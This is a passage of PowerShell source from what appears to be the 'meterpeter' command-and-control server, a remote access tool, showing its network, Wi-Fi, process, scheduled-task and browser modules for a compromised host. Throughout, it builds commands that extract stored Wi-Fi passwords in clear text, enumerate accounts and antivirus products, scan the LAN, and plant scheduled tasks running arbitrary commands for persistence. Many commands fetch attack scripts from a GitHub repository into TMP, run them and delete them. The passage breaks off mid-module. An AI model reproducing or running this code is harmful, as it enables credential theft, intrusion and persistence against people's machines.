           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "moon")
        {
           write-host "`n";
           $cmdline = "https://www.google.com/moon/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "mirror")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/google-mirror/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "pacman")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/pacman/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($EasterEgg -ieq "invaders")
        {
           write-host "`n";
           $cmdline = "https://elgoog.im/space-invaders/"
           $Command = "cmd /R start /max $cmdline;echo `"   [i] Opened: '$cmdline'`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }        
        If($EasterEgg -ieq "Return" -or $EasterEgg -ieq "cls" -or $EasterEgg -ieq "Modules" -or $EasterEgg -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $EasterEgg = $Null;
      }
      If($choise -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "modules")
      {
        $Command = $Null;
      }
      $choise = $Null;
      $Clear = $True;
    }

    If($Command -iMatch '^(Net|NetScanner)$')
    {
      write-host "`n`n   Description:" -ForegroundColor Yellow;
      write-host "   Remote network manager";
      write-host "`n`n   Modules     Description" -ForegroundColor green;
      write-host "   -------     -----------";
      write-host "   ListDNS     List remote host Domain Name entrys";
      write-host "   TCPinfo     List remote host TCP\UDP connections";
      write-host "   ListWifi    List remote host Profiles/SSID/Passwords";
      write-host "   PingScan    List devices ip addr\ports\dnsnames on Lan";
      write-host "   GeoLocate   List Client GeoLocation curl \ ifconfig.me";
      write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
      write-host "`n`n :meterpeter:Net> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      If($choise -ieq "ListDNS" -or $choise -ieq "dns")
      {
        write-host " * List of Remote-Host DNS Entrys." -ForegroundColor Green;Start-Sleep -Seconds 1
        $Command = "Get-DnsClientCache|Select-Object Entry,Name,DataLength,Data|Format-Table -AutoSize > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
      }
      If($choise -ieq "TCPinfo" -or $choise -ieq "TCP")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   This module enumerate ESTABLISHED TCP\UDP connections"
         write-host "   DNS Address Ip address and Hotnames, TCP Routing Table"
         write-host "`n`n   Modules  Description                    Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                    -------------------";
         write-host "   Stats    Query IPv4 Statistics          UserLand";
         write-host "   Query    Established TCP connections    UserLand";
         write-host "   Verbose  Query all TCP\UDP connections  UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Net:Tcp> " -NoNewline -ForeGroundColor Green;
         $ConManager_choise = Read-Host;
         If($ConManager_choise -ieq "Stats")
         {
            write-host " * Enumerating TCP statatistiscs." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Stats;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"         
         }
         If($ConManager_choise -ieq "Query")
         {
            write-host " * Enumerating established TCP connections.`n" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Enum;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
         If($ConManager_choise -ieq "Verbose")
         {
            write-host " * Enumerating established TCP\UDP connections.`n" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Verbose;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
         If($ConManager_choise -ieq "Return" -or $ConManager_choise -ieq "cls" -or $ConManager_choise -ieq "Modules" -or $ConManager_choise -ieq "clear")
         {
          $choise = $Null;
          $Command = $Null;
          $ConManager_choise = $Null;
        }
      }
      If($choise -ieq "ListWifi" -or $choise -ieq "wifi")
      {
        write-host "`n`n   Remark:" -ForegroundColor Yellow
        write-host "   Use single quotes if profile contains empty spaces."
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     -------------------";
        write-host "   ListProf  Remote-Host wifi Profile        UserLand";
        write-host "   ListNetw  List wifi Available networks    UserLand";
        write-host "   ListSSID  List Remote-Host SSID Entrys    UserLand";
        write-host "   SSIDPass  Extract Stored SSID passwords   UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Net:Wifi> " -NoNewline -ForeGroundColor Green;
        $wifi_choise = Read-Host;
        If($wifi_choise -ieq "ListProf" -or $wifi_choise -ieq "prof")
        {
          write-host " * Remote-Host Profile Statistics." -ForegroundColor Green;Start-Sleep -Seconds 1
          $Command = "cmd /R Netsh WLAN show interface `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve wifi profile ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListNetw" -or $wifi_choise -ieq "netw")
        {
          write-host " * List Available wifi Networks." -ForegroundColor Green;Start-Sleep -Seconds 1
          $Command = "cmd /R Netsh wlan show networks `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] None networks list found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListSSID" -or $wifi_choise -ieq "ssid")
        {
          write-host " * List of Remote-Host SSID profiles." -ForegroundColor Green;Start-Sleep -Seconds 1
          $Command = "cmd /R Netsh WLAN show profiles `> ssid.txt;`$check_tasks = Get-content ssid.txt;If(-not (`$check_tasks)){echo `"   [i] None SSID profile found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item ssid.txt -Force}else{Get-Content ssid.txt;Remove-Item ssid.txt -Force}";
        }
        If($wifi_choise -ieq "SSIDPass" -or $wifi_choise -ieq "pass")
        {
          write-host " - Sellect WIFI Profile: " -NoNewline;
          $profile = Read-Host;
          If(-not ($profile) -or $profile -eq " ")
          {
            write-host "  => Error: None Profile Name provided .." -ForegroundColor red -BackGroundColor white;
            write-host "  => Usage: meterpeter> AdvInfo -> WifiPass -> ListSSID (to List Profiles)." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
            Start-Sleep -Seconds 4;
            $Command = $Null;
            $profile = $Null;
          }else{
            write-host " * Extracting SSID Password." -ForegroundColor Green;Start-Sleep -Seconds 1
            $Command = "cmd /R netsh wlan show profile $profile Key=Clear `> key.txt;Get-Content key.txt;Remove-Item key.txt -Force"
          }
          $profile = $Null;
        }
        If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules" -or $wifi_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $choise = $Null;
        $wifi_choise = $Null;
      }
      If($choise -ieq "PingScan" -or $choise -ieq "Ping")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Module to scan local lan for active ip addreses";
         write-host "   or open ports if sellected the 'portscan' module.";
         write-host "   Remark: maxports portscan takes aprox 4 minutes." -ForeGroundColor yellow
         write-host "`n`n   Modules   Description                            Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                            ------------------";
         write-host "   Enum      List active ip addresses on local Lan  UserLand";
         write-host "   PortScan  Single ip port scanner \ dns resolver  UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Net:Ping> " -NoNewline -ForeGroundColor Green;
         $ping_choise = Read-Host;
         If($ping_choise -ieq "Enum")
         {
            Write-Host " - Ip addr range to scan (1,255): " -NoNewline
            $IpRange = Read-Host;
            If($IpRange -eq $null -or $IpRange -NotMatch ',')
            {
               $TimeOut = "300"
               $IpRange = "1,255"
               Write-Host "   => Error: wrong iprange, set demo to '$IpRange' .." -ForegroundColor Red
               Write-Host " * Remark: full scan takes aprox 2 minutes to finish."  -ForegroundColor Yellow
            }
            Else
            {
               $TimeOut = "300" #Faster discovery mode
            }

            #Execute command remotely
            Write-Host " * Scanning Lan for active devices!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action Enum -IpRange `"$IpRange`" -TimeOut `"$TimeOut`" -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "PortScan")
         {
            Write-Host " - Input ip address to scan ($Local_Host) : " -NoNewline
            $IpRange = Read-Host;
            If($IpRange -NotMatch '^(\d+\d+\d+)\.(\d+\d+\d+).')
            {
               $IpRange = "$Local_Host"
               Write-Host "   => Error: wrong iprange, set demo to '$IpRange' .." -ForegroundColor Red
            }

            Write-Host " - Set scantype (bullet|topports|maxports) : " -NoNewline
            $ScanType = Read-Host;
            If($ScanType -iNotMatch '^(bullet|TopPorts|MaxPorts)$')
            {
               $ScanType = "topports"
               Write-Host "   => Error: wrong scantype, set demo to '$ScanType' .." -ForegroundColor Red
            }

            #Execute command remotely
            Write-Host " * Scanning '" -ForegroundColor Green -NoNewline
            Write-Host "$IpRange" -ForegroundColor Red -NoNewline
            Write-Host "' ports\services!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -OutPut verbose -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "Return" -or $ping_choise -ieq "cls" -or $ping_choise -ieq "Modules")
         {
            $ping_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "GeoLocate" -or $choise -ieq "GEO")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Geo locate remote host and resolve public ip addr";
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     ------------------";
         write-host "   GeoLocate Client GeoLocation using curl   UserLand";
         write-host "   ifconfig  Client GeoLocation using ipinfo UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Net:Geo> " -NoNewline -ForeGroundColor Green;
         $Geo_choise = Read-Host;
         If($Geo_choise -ieq "GeoLocate")
         {
            Write-Host " - Resolve public ip addr? (y|n): " -NoNewline;
            $PublicIpSettings = Read-Host;
            If($PublicIpSettings -iMatch '^(y|yes)$')
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss false;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
            Else
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GeoLocation.ps1`" -OutFile `"`$Env:TMP\GeoLocation.ps1`"|Out-Null;powershell -File `$Env:TMP\GeoLocation.ps1 -HiddeMyAss true;Remove-Item -Path `$Env:TMP\GeoLocation.ps1 -Force"
            }
         }
         If($Geo_choise -ieq "ifconfig")
         {
            Write-Host " - Resolve public ip addr? (y|n) : " -NoNewline;
            $PublicIpSettings = Read-Host;
            Write-Host " - Display verbose outputs? (y|n): " -NoNewline;
            $Verboseme = Read-Host;
            If($Verboseme -iMatch '^(y|yes)$')
            {
               $Verboseme = "true"
            }
            Else
            {
               $Verboseme = "false"            
            }

            If($PublicIpSettings -iMatch '^(y|yes)$')
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1`" -OutFile `"`$Env:TMP\Get-ComputerGeoLocation.ps1`";powershell -File `$Env:TMP\Get-ComputerGeoLocation.ps1 -Api 'ifconfig' -Detail $Verboseme -PublicAddr false;Remove-Item -Path `$Env:TMP\Get-ComputerGeoLocation.ps1 -Force"
            }
            Else
            {
               #Execute command remotely
               Write-Host " * Scanning remote host geo location!" -ForegroundColor Green
               $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1`" -OutFile `"`$Env:TMP\Get-ComputerGeoLocation.ps1`";powershell -File `$Env:TMP\Get-ComputerGeoLocation.ps1 -Api 'ifconfig' -Detail $Verboseme -PublicAddr true;Remove-Item -Path `$Env:TMP\Get-ComputerGeoLocation.ps1 -Force"
            }
         }
         If($Geo_choise -ieq "Return" -or $Geo_choise -ieq "cls" -or $Geo_choise -ieq "Modules")
         {
            $Geo_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "modules")
      {
        $Command = $Null;
      }
 
    }

    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      write-host "`n`n   Description:" -ForegroundColor Yellow;
      write-host "   Advanced info manager";
      write-host "`n`n   Modules     Description" -ForegroundColor green;
      write-host "   -------     -----------";
      write-host "   Accounts    List remote host accounts";
      write-host "   RevShell    List client shell information";
      write-host "   ListAppl    List remote host installed appl";
      write-host "   Processes   List remote host processes info";
      write-host "   Tasks       List remote host schedule tasks";
      write-host "   Drives      List remote host mounted drives";
      write-host "   Browser     List remote host installed browsers";
      write-host "   Recent      List remote host recent directory";
      write-host "   ListSMB     List remote host SMB names\shares";
      write-host "   StartUp     List remote host startUp directory";
      write-host "   ListRun     List remote host startup run entrys";
      write-host "   AntiVirus   Enumerate all EDR Products installed";
      write-host "   OutLook     Manage OutLook Exchange Email Objects";
      write-host "   FRManager   Manage remote 'active' firewall rules";
      write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
      write-host "`n`n :meterpeter:Adv> " -NoNewline -ForeGroundColor Green;
      $choise = Read-Host;
      ## Runing sellected Module(s).
      If($choise -ieq "Accounts" -or $choise -ieq "acc")
      {
         write-host " * Listing remote host accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable,Caption|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
      }
      If($choise -ieq "RevShell" -or $choise -ieq "Shell")
      {
         write-host " * Enumerating shell privileges." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "echo `"   Client ppid  : `$pid `" `> Priv.txt;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   Client priv  : *ADMINISTRATOR*`" `>`> Priv.txt}Else{echo `"   Client priv  : USERLAND`" `>`> Priv.txt};`$Manufacturer = (Get-WmiObject Win32_OperatingSystem).Caption;echo `"   Client OS    : `$Manufacturer`" `>`> Priv.txt;`$ClientShell = (Get-location).Path;echo `"   Client path  : `$ClientShell`" `>`> Priv.txt;Get-Content Priv.txt;Remove-Item Priv.txt -Force"
      }
      If($choise -ieq "ListAppl" -or $choise -ieq "appl")
      {
         write-host " * List applications installed." -ForegroundColor Green;Start-Sleep -Seconds 1
         $Command = "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion | Format-Table -AutoSize";
      }
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Manage remote processes";
         write-host "`n`n   Modules    Description                        Privileges Required" -ForegroundColor green;
         write-host "   -------    -----------                        ------------------";
         write-host "   Check      List Remote Processe(s) Running    UserLand";
         write-host "   Query      Process name verbose information   UserLand";
         write-host "   DllSearch  List DLLs loaded by processes      UserLand";
         write-host "   Kill       Kill Remote Process From Running   Administrator";
         write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Proc> " -NoNewline -ForeGroundColor Green;
         $wifi_choise = Read-Host;
         If($wifi_choise -ieq "Query")
         {
            Write-Host " - Process Name: " -NoNewline -ForeGroundColor Red;
            $Proc_name = Read-Host;
            If(-not ($proc_name) -or $Proc_name -ieq " ")
            {
               write-host "`n`n   Error: We need to provide a process name ..`n" -ForegroundColor Red
               $Command = $Null;
               $Proc_name = $Null;
            }
            Else
            {
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1`" -OutFile `"`$Env:TMP\GetProcess.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\GetProcess.ps1`" -GetProcess Enum -ProcessName `"$Proc_name`" -verb true -exclude 'false';Remove-Item -Path `$Env:TMP\GetProcess.ps1 -Force";
            }
         }
         If($wifi_choise -ieq "DllSearch")
         {
               write-host ""
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DLLSearch.ps1`" -OutFile `"`$Env:TMP\DLLSearch.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\DLLSearch.ps1`" -filter 'all';Remove-Item -Path `$Env:TMP\DLLSearch.ps1 -Force";         
         }
         If($wifi_choise -ieq "Check")
         {
            write-host " * List remote processe(s) running." -ForegroundColor Green
            write-host "   => " -ForegroundColor Yellow -NoNewline
            write-host "exclude: " -ForegroundColor DarkGray -NoNewline
            write-host "SrTasks|wlanext|svchost|RuntimeBroker`n"
            
            Start-Sleep -Seconds 1
            $Command = "Get-Process|Select-Object Id,ProcessName,Description,ProductVersion|Where-Object{`$_.ProcessName -iNotMatch '(wlanext`|svchost`|RuntimeBroker`|SrTasks)'}|Format-Table -AutoSize|Out-File dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not(`$check_tasks)){echo `"   cmdlet failed to retrieve processes List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($wifi_choise -ieq "kill")
         {

            Write-Host " - kill [N]ProcessName or [P]PID: " -NoNewline -ForegroundColor Red
            $KillChoise = Read-Host
            If(-not($KillChoise) -or $KillChoise -iMatch '(n|ProcessName)')
            {
               Write-Host " - The process name to kill     : " -NoNewline
               $Proc_name = Read-Host
               If(-not ($proc_name) -or $Proc_name -ieq " ")
               {
                  write-host "`n   Error: We need to provide a process name ..`n" -ForegroundColor Red
                  $Command = $Null;
                  $Proc_name = $Null;
               }
               Else
               {

                  Write-Host " - Exclude PID from kill? (y|n) : " -NoNewline
                  $Exclusion = Read-Host
                  If(-not($Exclusion) -or $Exclusion -iMatch '(n|no)')
                  {
                     $Dontkill = "`$PID"
                  }
                  Else
                  {
                     Write-Host " - Input process PID number     : " -NoNewline
                     $Dontkill = Read-Host
                     If(-not ($Dontkill) -or $Dontkill -ieq " ")
                     {
                        $Dontkill = "`$PID"
                     }
                  }

                  write-host " * Killing $Proc_name remote process." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name $Proc_name -ppid false -dontkill `"$DontKill`";Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"
               }
            }
            Else
            {
               Write-Host " - PID of the process to kill   : " -NoNewline
               $Proc_name = Read-Host
               If(-not ($proc_name) -or $Proc_name -ieq " ")
               {
                  write-host "`n   Error: We need to provide a process PID ..`n" -ForegroundColor Red
                  $Command = $Null;
                  $Proc_name = $Null;
               }
               Else
               {
                  write-host " * Killing $Proc_name remote process PID." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name false -ppid $Proc_name;Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"        
               }
            }
         }
         If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules")
         {
            $wifi_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "tasks")
      {
         write-host "`n`n   Warnning:" -ForegroundColor Yellow;
         write-host "   In some targets schtasks service is configurated";
         write-host "   To not run any task IF connected to the battery";
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     ------------------";
         write-host "   Check     Retrieve Schedule Tasks         UserLand";
         write-host "   Query     Advanced Info Single Task       UserLand";
         write-host "   RunOnce   Create a new remote task        UserLand";
         write-host "   LoopExec  Create a new remote task        UserLand";
         write-host "   Delete    Delete Remote-Host Single Task  UserLand";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Tasks> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -ieq "Check")
         {
            write-host ""
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"check`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "Query")
         {
            write-Host " - Input TaskName: " -NoNewline -ForegroundColor DarkYellow
            $TaskName = Read-Host

            If(-not($TaskName))
            {
               $TaskName = "MeterpeterC2"
               write-host "   => Wrong setting, set taskname to: $TaskName" -ForegroundColor Red
            }

            write-host "`n"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"query`" -taskname `"$TaskName`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "RunOnce")
         {
            write-Host " - Input TaskName to create: " -NoNewline -ForegroundColor DarkYellow
            $TaskName = Read-Host
            If(-not($TaskName))
            {
               $TaskName = "MeterpeterC2"
               write-host "   => Wrong setting, set TaskName to: $TaskName" -ForegroundColor Red               
            }

            write-Host " - Input StartTime (13:45) : " -NoNewline -ForegroundColor DarkYellow
            $StartTime = Read-Host
            If(-not($StartTime))
            {
               $StartTime = "13:45"
               write-host "   => Wrong setting, set starttime to: $StartTime" -ForegroundColor Red
            }

            write-Host " - Input Command|BinaryPath: " -NoNewline -ForegroundColor DarkYellow
            $Execute = Read-Host
            If(-not($Execute))
            {
               $Execute = "cmd /c start calc.exe"
               write-host "   => Wrong setting, set Execute to: $Execute" -ForegroundColor Red                   
            }

            write-host ""
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"RunOnce`" -TaskName `"$TaskName`" -StartTime `"$StartTime`" -Execute `"$Execute`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "LoopExec")
         {
            write-Host " - Input Task Name to create   : " -NoNewline -ForegroundColor DarkYellow
            $TaskName = Read-Host;
            If(-not($TaskName))
            {
               $TaskName = "MeterpeterC2"
               write-host "   => Wrong setting, set TaskName to: $TaskName" -ForegroundColor Red                
            }

            write-Host " - Execute task after (minuts) : " -NoNewline -ForegroundColor DarkYellow
            $Interval = Read-Host
            If(-not($Interval))
            {
               $Interval = "10"
               write-host "   => Wrong setting, set Interval to: $Interval" -ForegroundColor Red                 
            }

            write-Host " - Task Duration (1 TO 9 Hours): " -NoNewline -ForegroundColor DarkYellow
            $Duration = Read-Host
            If(-not($Duration))
            {
               $Duration = "1"
               write-host "   => Wrong setting, set Duration to: $Duration" -ForegroundColor Red      
               
            }

            write-Host " - Input Command|Binary Path   : " -NoNewline -ForegroundColor DarkYellow
            $Execute = Read-Host
            If(-not($Execute))
            {
               $Execute = "cmd /c start calc.exe"
               write-host "   => Wrong setting, set Execute to: $Execute" -ForegroundColor Red                   
            }

            write-host "`n"
            $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"LoopExec`" -TaskName `"$TaskName`" -Interval `"$Interval`" -Duration `"$Duration`" -Execute `"$Execute`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "Delete")
         {
           write-Host " - Input TaskName: " -NoNewline -ForeGroundColor Red
           $TaskName = Read-Host

           If(-not($TaskName))
           {
              $TaskName = "MeterpeterC2"
               write-host "   => Wrong setting, set TaskName to: $TaskName" -ForegroundColor Red                
           }

           write-host "`n"
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/SchTasks.ps1`" -OutFile `"`$Env:TMP\SchTasks.ps1`"|Unblock-File;Powershell -file `"`$Env:TMP\SchTasks.ps1`" -action `"Delete`" -TaskName `"$TaskName`";Remove-Item -Path `"`$Env:TMP\SchTasks.ps1`" -Force"
         }
         If($my_choise -ieq "Return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "clear")
         {
           $Command = $Null;
           $my_choise = $Null;
         }
       }
      If($choise -ieq "Drives" -or $choise -ieq "driv")
      {
         write-host " * List mounted drives.`n" -ForegroundColor Green;Start-Sleep -Seconds 1
         $Command = "`$PSVERSION = (`$Host).version.Major;If(`$PSVERSION -gt 5){Get-PSDrive -PSProvider 'FileSystem'|Select-Object Root,CurrentLocation,Used,Free|ft|Out-File dellog.txt}Else{Get-Volume|Out-File dellog.txt};Get-Content dellog.txt;Remove-Item dellog.txt -Force";
      }
      If($choise -ieq "Browser")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow;
         write-host "   Enumerates remote host default browsers\versions";
         write-host "   Supported: Ie,Edge,Firefox,Chrome,Opera,Safari,Brave" -ForeGroundColor yellow;
         write-host "`n`n   Modules     Description                   Privileges Required" -ForegroundColor green;
         write-host "   -------     -----------                   ------------------";
         write-host "   Start       Enumerating remote browsers   UserLand";
         write-host "   addons      Enumerating browsers addons   UserLand";
         write-host "   Verbose     Enumerating browsers (slow)   UserLand";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Browser> " -NoNewline -ForeGroundColor Green;
         $Enumerate_choise = Read-Host;
         If($Enumerate_choise -ieq "Start")
         {
           write-host " * List $Remote_Host install browsers" -ForegroundColor Green
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -RECON;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
         }
         If($Enumerate_choise -ieq "addons")
         {
           write-host " * Installed browsers addons query." -ForegroundColor Green
